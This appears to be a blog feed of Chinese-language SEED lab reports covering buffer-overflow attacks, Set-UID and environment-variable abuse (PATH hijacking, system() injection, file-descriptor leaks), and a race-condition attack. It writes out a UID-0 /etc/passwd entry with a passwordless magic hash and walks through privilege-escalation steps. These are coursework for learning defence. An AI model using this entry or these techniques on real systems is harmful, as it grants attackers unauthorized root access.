<h2 id="Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2"><a href="#Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2" class="headerlink" title="Task 4：在不知道缓冲区大小的情况下实施攻击 (Level 2)"></a>Task 4：在不知道缓冲区大小的情况下实施攻击 (Level 2)</h2><p>在 Level 1 攻击中，我们通过 gdb 调试获得了缓冲区的大小，但是在真实攻击中，缓冲区大小的信息可能很难获得。例如，如果目标程序是运行在远程机器上的服务器程序时，那么我们将无法获得二进制代码或源代码的副本。在本任务中，我们将添加一个约束条件：你仍然可以使用 gdb，但不允许获得缓冲区的大小。实际上， Makefile 文件提供了缓冲区的大小，但是在攻击中不允许使用该信息。你的任务是让漏洞程序在此约束条件下运行 shellcode。</p>
<p>补全值如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213939.png"></p>
<p>运行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213958.png"></p>
<p>解释说明：</p>
<p>Shellcode，start，ret 填写方法同任务三，在填写 offset 时，由于不知道缓冲区大小，不可以直接获取buffer 地址，因而需要尝试其他方法如下，在 gdb 中查看bof 函数的执行步骤时可以观察到如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214058.png"></p>
<p>可以观察到bof 函数栈向下开辟了 164 位，因而可以推断出其缓冲区的大小在 100-164 之间，向下进行尝试，直到攻击成功，即可得到缓冲区大小为 160，同理即可计算出offset 的值位 172。</p>
<h2 id="Task-5：对-64-bit-程序实施攻击-Level-3"><a href="#Task-5：对-64-bit-程序实施攻击-Level-3" class="headerlink" title="Task 5：对 64-bit 程序实施攻击 (Level 3)"></a>Task 5：对 64-bit 程序实施攻击 (Level 3)</h2><p>在本任务中，我们将漏洞程序编译为一个称为 stack-L3 的 64-bit 二进制文件。我们将对该程序实施 攻击。编译和设置 Set-UID 命令已经包含在 Makefile 文件中。与之前的任务类似，你需要在实验报告中提供详细的攻击过程。对于 64-bit 程序，使用 gdb 调试的方法与 32-bit 程序相同。唯一的区别是帧指针寄存器的名称不同。在 x86 体系结构中，帧指针寄存器为 ebp，而在 x64 体系结构中，帧指针寄存器rbp。</p>
<p>补全值如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214234.png"></p>
<p>运行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214251.png"></p>
<p>解释说明：</p>
<p>由于该程序为 64bit，需要修改 shellcode，修改为前面任务中所给出编码后的结果即可，start，ret，offset 的设置方法同 32bit 程序中的攻击，如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214334.png"></p>
<p>此处由于为64位程序，在取值结果上，应该分别偏移16位，和8位。</p>
<h2 id="Task-6：对-64-bit-程序实施攻击-Level-4"><a href="#Task-6：对-64-bit-程序实施攻击-Level-4" class="headerlink" title="Task 6：对 64-bit 程序实施攻击 (Level 4)"></a>Task 6：对 64-bit 程序实施攻击 (Level 4)</h2><p>本任务中的目标程序 (stack-L4) 与 Level 3 中的目标程序类似，除了缓冲区大小非常小之外。本任务中，我们将缓冲区大小设置为 10，而在 Level 3 中的缓冲区要大得多。目标还是一样的：通过攻击Set-UID 程序来获得 root shell。由于缓冲区大小较小，你可能会在攻击中遇到其他挑战。在这种情况下，你需要解释你是如何在攻击中解决这些挑战的。</p>
<p>补全值如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214455.png"></p>
<p>运行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214523.png"></p>
<p>解释说明：</p>
<p>填写方法同上一次任务，未遇到新的挑战。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214608.png"></p>
<h2 id="Task-7：攻破-dash-的保护机制"><a href="#Task-7：攻破-dash-的保护机制" class="headerlink" title="Task 7：攻破 dash 的保护机制"></a>Task 7：攻破 dash 的保护机制</h2><p>将 call_shellcode.c 编译为以 root 为所有者的二进制文件（通过输入”make setuid” 命令）。在不调用 setuid(0) 的情况下运行 a32.out 和 a64.out，然后在调用 setuid(0) 的情况下再次运行a32.out 和 a64.out。请描述并解释你的观察结果。</p>
<p>运行结果：</p>
<p>​	下图为调用setuid(0) 的情况，如图得到了超级用户权限的shell：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214709.png"></p>
<p>​	下图为没有调用setuid(0) 的情况，如图得到普通用户的 shell：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214729.png"></p>
<p>解释说明：</p>
<p>在调用setuid(0) 的情况下，将&#x2F;bin&#x2F;sh 符号连接到了&#x2F;bin&#x2F;dash，运行shellcode 后会得到超级用户权限，而未调用时，&#x2F;bin&#x2F;sh 符号连接到了 zsh，仅可以得到普通用户权限。</p>
<p>现在，使用更新的 shellcode 并打开 shell 的安全机制，我们可以再次尝试攻击漏洞程序。对 Level 1 重新进行攻击，观察是否可以获得 root shell。在获得 root shell 之后，请运行下面的命令证明安全机制已经打开。虽然不要求对 Level 2 和 Level 3 重新进行攻击，但是你可以自行尝试并观察攻击是否有效。</p>
<p>运行结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214805.png"></p>
<p>可以观察到&#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;dash，证明安全机制已打开。</p>
<h2 id="Task-8：攻破地址随机化"><a href="#Task-8：攻破地址随机化" class="headerlink" title="Task 8：攻破地址随机化"></a>Task 8：攻破地址随机化</h2><p>在 32-bit Linux 机器上，栈的可用熵为 19 比特，意味着栈的基地址有 219 &#x3D; 524, 288 种可能性。这个数字并不是很大，可以很容易地使用暴力方法穷举。在本任务中，我们使用这种方法来攻破 32-bit VM 上的地址随机化安全机制。首先我们使用以下命令打开 Ubuntu 的地址随机化，然后对 stack-L1 实施相同的攻击。请描述和解释你的观察结果。</p>
<p>运行结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214858.png"></p>
<p>解释说明：</p>
<p>开启地址随机化后，python 文件中所填写的地址为调试程序时得到的栈函数中的地址，但在重新执行函数时，其地址发生改变，返回地址错误，因而攻击失败。</p>
<p>然后我们使用暴力的方法反复攻击漏洞程序，直到我们放在 badfile 文件中的地址正确为止。我们 只对 32-bit 程序 stack-L1 尝试攻击。</p>
<p>攻击结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130214933.png"></p>
<h2 id="Task-9：测试其他保护机制"><a href="#Task-9：测试其他保护机制" class="headerlink" title="Task 9：测试其他保护机制"></a>Task 9：测试其他保护机制</h2><ul>
<li><p>打开 StackGuard 保护机制</p>
<p>通过在没有-fno-stack-protector 选项的情况下重 新编译漏洞程序 stack.c 来打开 StackGuard 保护机制。在 gcc 4.3.3 版本及更高版本中，默认启用了 StackGuard。实施攻击；报告并解释你的观察结果。</p>
<p>运行结果如下：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130215012.png"></p>
<p>​		解释说明：</p>
<p>​		在打开栈保护机制后重新编译并且进行攻击，会发现攻击失败，报错 “*** stack smashing detected ***: terminatedAborted”</p>
<p>​		原因在于buffer 大小只有 100 而在bof 函数中将 517 位的字符串放到了buffer中，造成了缓冲区溢出，在打开StackGuard 保护机制后，数组越界会发生报错。</p>
<ul>
<li><p>打开不可执行栈保护机制</p>
<p>在本任务中，我们将使栈不可执行。我们在 shellcode 文件夹中完成该实验。 call_shellcode 程序将 shellcode 的副本放在栈上，然后在栈上执行代码。请在不使用-z execstack 选项的情况下重新编译call_shellcode.c，分别编译为 a32.out 和 a64.out。运行它们并描述和解释你的观察结果。</p>
<p>运行结果如下：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130215116.png"></p>
<p>​		解释说明：</p>
<p>​		在打开不可执行栈保护及之后，可以看到重新编译后的.out 文件无法成功运行，原因在于该机制会检测栈中的内容，发现其为非法命令比如打开shell时。便会进行保护机制，使其不可执行，保障系统安全。</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>环境变量与Set-UID</title>
    <url>/2023/09/14/Setuid/</url>
    <content><![CDATA[<h1 id="环境变量与setuid实验"><a href="#环境变量与setuid实验" class="headerlink" title="环境变量与setuid实验"></a>环境变量与setuid实验</h1><h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让你理解环境变量是如何影响程序和系统的行为的。环境变量是存储在进程中的一系列动态命名的值，可以影响计算机上进程的行为方式。自从1979 年Unix 引入环境变量以来，大多数操作系统也开始采用环境变量。尽管环境变量会影响程序的行为，但是它是如何产生影响的，许多程序员并不真正理解。因此，如果一个程序利用了环境变量但是程序员不清楚它的运用，就可能会导致程序漏洞。</p>
<span id="more"></span>
<p>在本实验中，你将理解环境变量是如何工作，子进程是如何继承父进程的环境变量的，以及环境变量如何影响系统&#x2F;程序的行为的。我们还会特别了解环境变量是如何影响Set-UID 特权程序的行为的。本实验涵盖以下主题:</p>
<p>1. 环境变量</p>
<p>2. Set-UID 程序</p>
<p>3. 安全地调用外部程序</p>
<p>4. 权限泄漏</p>
<p>5. 动态装载器&#x2F;链接器</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：配置环境变量"><a href="#2-1-Task-1：配置环境变量" class="headerlink" title="2.1 Task 1：配置环境变量"></a>2.1 Task 1：配置环境变量</h3><p>本任务中，我们学习设置和删除环境变量的指令。我们用Bash 来完成。用户使用的默认的shell 设置在文件&#x2F;etc&#x2F;passwd 中（每一项的最后一个字段）。你可以用chsh 命令来修改shell 程序（本实验无需修改）。请完成以下任务：</p>
<p>• 使用printenv 或者env 指令来打印环境变量。如果你对某个特定的环境变量感兴趣，比如PWD， 你可以用指令“printenv PWD”或者“env | grep PWD”。</p>
<p>我们可以打印全部环境变量以及PWD如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140936255.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140937831.png"></p>
<p>• 使用export 和unset 来设置或者取消环境变量。注意: 这两个指令不是单独的程序；它们是两个Bash 的内部指令（即，你不能在Bash 外调用它们噢）</p>
<p>设置一个新的环境变量然后取消 MYENV，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140942383.png"></p>
<h3 id="2-2-Task-2-从父进程向子进程传递环境变量"><a href="#2-2-Task-2-从父进程向子进程传递环境变量" class="headerlink" title="2.2 Task 2: 从父进程向子进程传递环境变量"></a>2.2 Task 2: 从父进程向子进程传递环境变量</h3><p>本任务中，我们研究子进程是如何继承父进程的环境变量的。Unix 操作系统中，fork() 系统调用会复制发起调用的进程，创建一个新进程。新进程称作子进程，被复制的进程称作父进程。然而，有些东西是没有被子进程继承的（在命令行中输入指令man fork，可以查看fork() 的指南）。在本任务中，我们想要知道子进程是否继承了父进程的环境变量。</p>
<p>Step1：编译并运行 myprintenv.c 文件，将输出保存到一个文件中</p>
<p>Step2：注释掉子进程的语句，取消注释父进程printenv()语句，再次编译并运行代码，将结果保存在另一个文件中。</p>
<p>两次的运行输出结果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140942584.png"></p>
<p>Step3：使用diff命令比较两个文件的差异，描述你得出的结论。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140943286.png"></p>
<p>可以观察到两个文件只有文件名不同，其余环境变量均相同，说明在Linux中子进程继承了父进程除名字外的所有环境变量。</p>
<h3 id="2-3-Task3：环境变量与execve"><a href="#2-3-Task3：环境变量与execve" class="headerlink" title="2.3 Task3：环境变量与execve()"></a>2.3 Task3：环境变量与execve()</h3><p>本任务中，我们研究通过execve() 运行一个新程序，环境变量是如何受影响的。函数execve() 调用系统调用来加载新命令并执行它；这个函数永远不会返回。没有创建新进程；相反，调用进程的代码段、数据段、bss 段和栈被加载的程序覆盖。本质上，execve() 在调用进程中运行了新程序。我们对环境变量发生了什么感兴趣；它们会被新程序自动继承吗？</p>
<p>Step1：编译并运行给出程序，描述观察。如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140943684.png"></p>
<p>可以看到该程序编译运行后没有打印任何内容</p>
<p>Step2：修改execve()的调用内容，重新编译并运行程序，描述观察。如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140944354.png"></p>
<p>可以观察到该程序会输出打印当前文件下的所有环境变量。</p>
<p>Step3：请就新程序如何获得其环境变量得出你的结论。</p>
<p>首先对execve()函数进行分析，可以得到其有三个参数如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140944722.png"></p>
<p>其中filename是一个二进制可执行文件，argv是调用程序执行的参数序列，也就是我们要调用程序所需要传入的参数，envp是参数序列作为新程序的环境。</p>
<p>在第一步中，新程序的环境输入为NULL，表示终止符，并未输入键值对作为环境变量，因而其输出打印的结果为空，而在第二步中将environ作文新程序的环境输入，该指针变量指向包含所有环境变量的一个列表，因而将其赋予新进程即可以打印出当前所有的环境变量。</p>
<h3 id="2-4-Task-4：环境变量和system"><a href="#2-4-Task-4：环境变量和system" class="headerlink" title="2.4 Task 4：环境变量和system()"></a>2.4 Task 4：环境变量和system()</h3><p>本任务中，我们研究通过system() 运行一个新程序，环境变量是如何受影响的。system() 也是用来执行一个命令的，但是和execve() 直接执行一个命令不同，system() 实际上执行“&#x2F;bin&#x2F;sh -c command”，即它先执行&#x2F;bin&#x2F;sh，然后让shell 执行这个command。</p>
<p>如果你查阅system() 函数的实现，你会发现它使用execl() 来执行&#x2F;bin&#x2F;sh；execl() 调用execve()，并将环境变量数组传递给它。因此，使用system() 时，调用进程的环境变量会传递给新程序&#x2F;bin&#x2F;sh。请编译并运行以下程序来验证这一点。</p>
<p>首先对system函数进行分析，其用于执行shell（Linux&#x2F;Unix系统）命令，只有一个参数command，即命令名。调用进程的环境变量会传递给新程序&#x2F;bin&#x2F;sh，运行结果如下图，会打印出当前的环境变量</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140945125.png"></p>
<h3 id="2-5-Task-5：环境变量与Set-UID程序"><a href="#2-5-Task-5：环境变量与Set-UID程序" class="headerlink" title="2.5 Task 5：环境变量与Set-UID程序"></a>2.5 Task 5：环境变量与Set-UID程序</h3><p>Set-UID 是Unix 系统中重要的安全机制。当Set-UID 程序执行时，它将获得程序拥有者的权限。如果程序执行者是root，所有执行该程序的人都将以root 权限执行该程序。Set-UID 使得我们可以做许多有趣的事情，但是在执行Set-UID 程序时，会提高执行者的权限，这是有风险的。尽管Set-UID 的行为是由他们的程序逻辑所决定的，而不是用户决定的，用户却可以通过环境变量来修改Set-UID 的行为。为了理解Set-UID 程序是如何被影响的，我们首先弄清楚Set-UID 程序的环境变量是否由用户程序继承而来。</p>
<p>Step1：编写所给出的程序，打印当前进程的所有环境变量。</p>
<p>Step2：编译上述程序得到foo，将其所有者更改为root，并使其成为一个Set-UID程序</p>
<p>Step3：在shell中设置给出的环境变量，这些环境变量是在普通用户的shell 进程中设置的。在你的shell 中运行第2 步中的Set-UID程序。在shell 中键入程序名后，shell 会fork 一个子进程，并使用子进程来运行该程序。请检查你在shell进程（父进程）中设置的所有环境变量是否都进入了Set-UID 子进程。描述你的观察。如果你有惊奇的发现，请描述它们。</p>
<p>首先编写给出程序，并且将其设置为Set-UID程序，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140946892.png"></p>
<p>然后查看所给出变量是否存在，并且利用export命令设置环境变量如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140946056.png"></p>
<p>可以观察到在shell中本来只有PATH存在。</p>
<p>在子进程中查看环境变量，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140947096.png"></p>
<p>可以看到PATH和MYENV环境变量被继承，而LD_LIBRARY_PATH并未被继承。</p>
<h3 id="2-6-Task6：PATH环境变量和Set-UID程序"><a href="#2-6-Task6：PATH环境变量和Set-UID程序" class="headerlink" title="2.6 Task6：PATH环境变量和Set-UID程序"></a>2.6 Task6：PATH环境变量和Set-UID程序</h3><p>由于调用了shell 程序，在Set-UID 程序中调用system() 是非常危险的。这是因为shell 程序的实际行为会受到环境变量的影响，例如PATH 环境变量；这些环境变量由用户提供，可能是恶意的。通过更改这些变量，恶意用户可以控制Set-UID 程序的行为。</p>
<p>利用所给出的程序实现攻击步骤如下所示：</p>
<p>首先编写该程序，并且执行，发现该程序可以打印当前目录下的文件，结果如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140947368.png"></p>
<p>修改当前目录到PATH环境变量的首部，然后将&#x2F;bin&#x2F;cal文件复制到当前目录下，并且命名为ls，重新执行命令ls，可以发现其作用被修改。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948525.png"></p>
<p>其次再将所编写的程序设置为Set-UID程序</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948908.png"></p>
<p>重新执行task6程序，可以观察到其实在执行cal命令，原因在于PATH环境变量的首部被修改为了当前目录，而在调用system函数执行命令的时候，会在PATH环境变量中的目录按顺序进行查找是否有当前命令，因而可以实现攻击。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948220.png"></p>
<p>如果不是将cal而是把zsh复制到当前目录中，便可以成功得到当前系统的超级用户特权如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949623.png"></p>
<p>与此同时打印当前的id信息如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949871.png"></p>
<p>可以观察到当前执行实在seed用户下的，并未以root权限运行，根据手册中的提示，关掉保护策略后，重复上述攻击，可以观察到结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949332.png"></p>
<p>可以看到euid&#x3D;0，当前代码是以root程序运行的。</p>
<h3 id="2-7-Task7：LD-PRELOAD环境变量和Set-UID程序"><a href="#2-7-Task7：LD-PRELOAD环境变量和Set-UID程序" class="headerlink" title="2.7 Task7：LD_PRELOAD环境变量和Set-UID程序"></a>2.7 Task7：LD_PRELOAD环境变量和Set-UID程序</h3><p>在这个任务中，我们研究Set-UID 程序如何处理某些环境变量，包括LD_PRELOAD、LD_LIBRARY_PATH和其他LD_* 如何影响动态加载器&#x2F;链接器的行为。动态加载器&#x2F;链接器是操作系统(OS) 的一部分，它加载（从持久性存储到RAM）并链接可执行文件在运行时所需的共享库。</p>
<p>在Linux 中，ld.so 或ld-linux.so 是动态加载器&#x2F;链接器（用于不同类型的二进制文件）。在影响其行为的环境变量中，本实验关注LD_LIBRARY_PATH 和LD_PRELOAD。在Linux 中，LD_LIBRARY_PATH 是一组以冒号分隔的目录，应首先在其中搜索库，然后是标准目录集。LD_PRELOAD 指定了要在所有其他库之前加载的附加的用户指定的共享库的列表。在这个任务中，我们将只研究LD_PRELOAD。</p>
<p>Step1：按照实验手册指导构建动态链接库</p>
<p>Step2：在不同条件下运行myprog，观察发生现象。</p>
<p>Case1：普通程序，普通用户执行，可以看到程序正常运行：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950807.png"></p>
<p>case2：set-uid特权程序，普通用户执行，停顿后并未调用库函数：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950868.png"></p>
<p>case3：set-uid特权程序，在root下重新设置LD_PRELOAD环境变量，并执行，可以观察到程序正常运行：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950677.png"></p>
<p>case4：使myprog 为一个Set-UIDUser1 程序（User1 是程序的所有者，是另一个用户账户），在另一个用户账户下重新加LD_PRELOAD 环境变量，并执行它,新建用户并将该myprog修改为Set-UIDUser1 程序，执行后如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140951249.png"></p>
<p>Step3：原因解释，在step2中执行每种情况的同时打印每一次当前状态下的LD_PRELOAD 环境变量，即可观察到原因</p>
<p>当一个正常程序的时候，子进程会继承这个环境变量；当他是一个SETUID程序的时候，子进程没有继承该环境变量；所有者是user1，即使有环境变量也不可以调用，我们可以得出这种继承策略是一种很好的保护策略。</p>
<h3 id="2-8-Task8：使用system-和execve-调用外部程序的对比"><a href="#2-8-Task8：使用system-和execve-调用外部程序的对比" class="headerlink" title="2.8 Task8：使用system()和execve()调用外部程序的对比"></a>2.8 Task8：使用system()和execve()调用外部程序的对比</h3><p>尽管system() 和execve() 都可以被用于执行新的程序，但是system() 在高特权态下更加危险，比如Set-UID 程序。在前面的任务里，我们看到了PATH 环境变量是如何影响system() 的行为的，因为该变量会影响shell 的工作。execve() 则没有这个问题，因为它不调用shell。除了环境变量，调用shell还有另外危险的结果。</p>
<p>Step1：编译所给出程序，使其成为set-uid程序，进行攻击如下：</p>
<p>首先编译并修改后，运行该程序，可以看到该进程会利用cat打印出文件内容</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140954057.png"></p>
<p>然后我们尝试打印&#x2F;etc&#x2F;shadow，属于root权限下才可以读的文件，发现不允许：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140954885.png"></p>
<p>关掉系统的保护策略后重新读取，发现可以成功读取，如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955377.png"></p>
<p>由于程序种调用了system函数，在传递参数的时候没有将代码和数据进行分离，因而可以利用构造参数，使前者作为函数参数后者作为命令执行，进行得到系统超级权限，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955212.png"></p>
<p>得到root权限后便可以随意删除没有写权限的文件，因而bob可以损害系统的完整性。</p>
<h3 id="2-9-Task9：权限泄露"><a href="#2-9-Task9：权限泄露" class="headerlink" title="2.9 Task9：权限泄露"></a>2.9 Task9：权限泄露</h3><p>为了遵循最小权限原则，Set-UID 程序如果不再需要这种权限，它会永久地放弃root 权限。此外，有时程序需要将其控制权交给用户，在这种情况下，root 权限必须被撤销。setuid() 系统调用可以用来撤销权限。根据手册，setuid() 设置调用进程的有效用户ID。如果调用者的有效UID 是root，真实的UID和保存的set-user-id 也被设置。因此，如果一个有效UID 为0 的Set-UID 程序调用setuid(n)，则该进程将成为正常进程，其所有的UID 都设置为n。</p>
<p>当撤销权限的时候，最常见的错误就是权限泄露。该进程可能在它仍然享有特权时已经获得了一些特权功能。当特权降级时，如果程序没有清理这些功能，则它们仍然可以由非特权进程访问。换句话说，虽然进程的有效用户ID 变为非特权，但是该进程仍具有特权，因为它具有特权能力。编译以下程序，将其所有者更改为root，并使其成为Set-UID 程序。以普通用户身份运行程序。你能利用这个程序中的权限泄漏漏洞吗？目标是以普通用户身份写入&#x2F;etc&#x2F;zzz 文件。</p>
<p>攻击步骤如下：</p>
<p>首先对所给出的漏洞程序进行编译，并且修改为setuid程序</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955034.png"></p>
<p>然后尝试对&#x2F;etc&#x2F;zzz文件进行写入，发现没有权限，原因在于，当前状态下，该程序的euid已经修改为了普通用户而非root权限</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140956755.png"></p>
<p>但是由于当前该程序仍然在执行，而且在程序中打开了文件后，并未进行合法的关闭与退出，因而我们可以根据所打印出的文件描述符fd进行文件写入，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140956822.png"></p>
<p>可以看到攻击成功，将自己的文本写入了zzz文件中，针对于这种攻击，修补方法便是销毁文件描述符，即关闭文件。</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>条件竞争漏洞</title>
    <url>/2023/09/14/competation%20volunerilty/</url>
    <content><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让学生将从课堂上学到的关于竞争条件漏洞的知识付诸行动，以获得关于竞争条件漏洞的第一手经验。当多个进程同时访问和操作相同的数据时，会出现竞争条件，执行的结果取决于访问发生的特定顺序。如果特权程序存在竞争条件漏洞，攻击者可以运行并行进程与特权程序“竞争”，从而改变程序的行为。</p>
<span id="more"></span>
<p>本实验中，学生得到一个包含竞争条件漏洞的程序；他们的任务是开发一种利用漏洞并获得 root 权限的方案。除了攻击方法外，还将引导学生了解几种可用于对抗竞争条件攻击的保护方案。学生需要评估这些方案是否有效，并解释原因。本实验涵盖以下主题：</p>
<p>1. 竞争条件漏洞</p>
<p>2. 粘滞符号链接保护</p>
<p>3. 最小权限原则</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：选择目标"><a href="#2-1-Task-1：选择目标" class="headerlink" title="2.1 Task 1：选择目标"></a>2.1 Task 1：选择目标</h3><p>我们希望利用程序中的竞争条件漏洞。我们选择以普通用户无法写入的口令文件&#x2F;etc&#x2F;passwd 为目标。通过利用该漏洞，我们希望向口令文件添加一条记录，目的是创建一个具有 root 权限的新用户账号.在该口令文件中，每个用户都有一个条目，该条目由七个字段组成并用冒号 (:) 分隔。root 用户的条目如下所示。</p>
<table>
<thead>
<tr>
<th>root: x :0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</th>
</tr>
</thead>
</table>
<p>为了验证 magic 值口令是否有效，我们（作为超级用户）手动将以下条目添加到&#x2F;etc&#x2F;passwd文件的末尾。请在报告中说明你是否可以在不键入口令的情况下登录 test 账户，并检查你是否具有 root 权限。</p>
<table>
<thead>
<tr>
<th>test:U6aMy0wojraho:0:0:test:&#x2F;root:&#x2F;bin&#x2F;bash</th>
</tr>
</thead>
</table>
<p>利用gedit打开并修改&#x2F;etc&#x2F;passwd 文件，然后进行登录如下，证明具有root权限</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20230914090952.png"></p>
<h3 id="2-2-Task-2：发起竞争条件攻击"><a href="#2-2-Task-2：发起竞争条件攻击" class="headerlink" title="2.2 Task 2：发起竞争条件攻击"></a>2.2 Task 2：发起竞争条件攻击</h3><p>此任务的目标是利用前面列出的易受攻击的 Set-UID 程序中的竞争条件漏洞。最终目标是获得 root权限。攻击的最关键步骤是使&#x2F;tmp&#x2F;XYZ 指向口令文件，该步骤必须发生在检查和使用之间的窗口内；即在易受攻击程序中的 access 和 fopen 调用之间。</p>
<h4 id="Task-2-A：模拟一个缓慢的机器"><a href="#Task-2-A：模拟一个缓慢的机器" class="headerlink" title="Task 2.A：模拟一个缓慢的机器"></a>Task 2.A：模拟一个缓慢的机器</h4><p>假设机器非常慢，在 access() 和 fopen() 调用之间有一个 10 秒的时间窗口。通过此添加，vulp 程序（重新编译时)将暂停并将控制权交给操作系统 10 秒。我们的工作是手动执行一些操作，因此当程序在 10 秒后恢复时，该程序可以帮助你将 root 帐户添加到系统中。请演示如何实现这一点。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140912547.png"></p>
<p>再漏洞程序中进行添加如上代码后，重新编译该程序，并按实验手册进行：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140913020.png"></p>
